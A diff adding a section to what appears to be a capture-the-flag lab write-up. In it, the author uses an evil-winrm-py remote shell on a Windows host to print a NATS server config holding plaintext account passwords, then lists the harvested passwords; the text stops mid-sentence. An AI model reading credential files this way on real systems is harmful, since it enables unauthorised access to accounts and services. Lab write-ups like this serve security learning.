@@ -537,7 +537,42 @@ Both passwords found for both domain users dont work for any other domain user
 
 The user `nathan.aadam` is part of remote management users group, and also two other interesting groups
 
-# NATS s
+# NATS server config
+
+```python
+evil-winrm-py PS C:\Program Files\Nats-Server> type nats-server.conf
+listen: '0.0.0.0:4222'
+
+jetstream: {
+  store_dir: 'C:\Program Files\Nats-Server\tmp'
+}
+
+accounts: {
+  '$SYS': {
+    users: [
+      { user: 'sysadmin', password: 'bb5M0k5XWIGD' } 
+    ]
+  },
+  
+  'dev': {
+    jetstream: true,
+    users: [
+      { user: 'Dev_Account_A', password: 'hx5h7F5554fP@1337!' }, 
+      { user: 'Dev_Account_B', password: 'tvPFGAzdsJfHzbRJ' }
+    ]
+  }
+}
+evil-winrm-py PS C:\Program Files\Nats-Server>
+```
+
+Found some passwords
+
+```python
+bb5M0k5XWIGD
+tvPFGAzdsJfHzbRJ
+```
+
+The other one is a password for 
 
 
 
